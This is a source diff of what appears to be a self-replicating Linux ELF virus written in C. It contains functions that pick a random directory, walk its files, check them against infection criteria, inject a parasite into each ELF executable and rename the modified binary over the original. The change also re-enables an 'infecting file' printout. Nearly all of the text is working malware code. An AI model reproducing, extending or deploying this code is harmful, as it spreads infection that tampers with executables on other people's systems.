@@ -184,39 +184,38 @@ void * vx_malloc(size_t len, uint8_t **mem)
 	return (void *)((char *)*mem - len);
 }
 
-void vx_free(uint8_t *mem)
+static inline void vx_free(uint8_t *mem)
 {
 	uintptr_t addr = (uintptr_t)mem;
 	addr &= ~4095;
 	mem = (uint8_t *)addr;
 	_munmap(mem, 4096);
 }
-/*
- * We rely on ASLR to get our psuedo randomness, since RSP will be different
- * at each execution.
- */
-int _rand(long *seed) // RAND_MAX assumed to be 32767
+
+static inline int _rand(long *seed) // RAND_MAX assumed to be 32767
 {
         *seed = *seed * 1103515245 + 12345;
         return (unsigned int)(*seed / 65536) & 32767;
 }
-
-uint32_t get_random_number(int max)
+/*
+ * We rely on ASLR to get our psuedo randomness, since RSP will be different
+ * at each execution.
+ */
+static inline uint32_t get_random_number(int max)
 {
 	long rsp;
         asm __volatile__("mov %%rsp, %0" : "=r"(rsp));
 	return _rand(&rsp) % max;
 }
 	
-char * randomly_select_dir(char **dirs) 
+static inline char * randomly_select_dir(char **dirs) 
 {	
 	return (char *)dirs[get_random_number(DIR_COUNT)];
 }
 
-char * full_path(char *exe, char *dir)
+char * full_path(char *exe, char *dir, uint8_t **heap)
 {
-	static uint8_t *heap = NULL;
-	char *ptr = (char *)vx_malloc(_strlen(exe) + _strlen(dir) + 2, &heap);
+	char *ptr = (char *)vx_malloc(_strlen(exe) + _strlen(dir) + 2, heap);
 	Memset(ptr, 0, _strlen(exe) + _strlen(dir));
 	_memcpy(ptr, dir, _strlen(dir));
 	ptr[_strlen(dir)] = '/';
@@ -282,17 +281,15 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
         if ((c = _write(ofd, mem, final_length)) != final_length) 
 		return -1;
         _fsync(ofd);
-	if (_close(ofd) < 0)
-		_printf("close failed\n");
-	_printf("Renaming %s to %s\n", TMP, target->path);
+	_close(ofd);
  	if (_close(target->fd) < 0)
-		_printf("close failed\n");
+		DEBUG_PRINT("close failed\n");
        	if (_munmap(target->mem, target->size) < 0)
-		_printf("munmap failed\n");
-	
-	if (_rename(TMP, target->path) < 0)
-		DEBUG_PRINT("rename failed\n");
-        
+		DEBUG_PRINT("munmap failed\n");
+	_rename(TMP, target->path);
+         if (_rename(TMP, target->path) < 0)
+                DEBUG_PRINT("rename failed\n");
+
 	return 0;
 }
 
@@ -395,7 +392,7 @@ int load_target(const char *path, elfbin_t *elf)
 {
 	int i;
 	struct stat st;
-	elf->path = path;
+	elf->path = (char *)path;
 	int fd = _open(path, O_RDONLY, 0);
 	if (fd < 0)
 		return -1;
@@ -468,7 +465,7 @@ void do_main(struct bootstrap_data *bootstrap)
 	Elf64_Ehdr *ehdr;
 	Elf64_Phdr *phdr;
 	Elf64_Shdr *shdr;
-	uint8_t *mem;
+	uint8_t *mem, *heap = NULL;
 	
 	struct linux_dirent64 *d;
 	int bpos, fcount, dd, nread;
@@ -520,9 +517,9 @@ void do_main(struct bootstrap_data *bootstrap)
 			//	continue;
 			if (d->d_name[0] == '.')
 				continue;
-			if (check_criteria(fpath = full_path(d->d_name, dir)) < 0)
+			if (check_criteria(fpath = full_path(d->d_name, dir, &heap)) < 0)
 				continue;
-			//DEBUG_PRINT("infecting file: %s\n", d->d_name);
+			_printf("infecting file: %s\n", d->d_name);
 			
 			load_target(fpath, &target);
 			infect_elf_file(&self, &target);
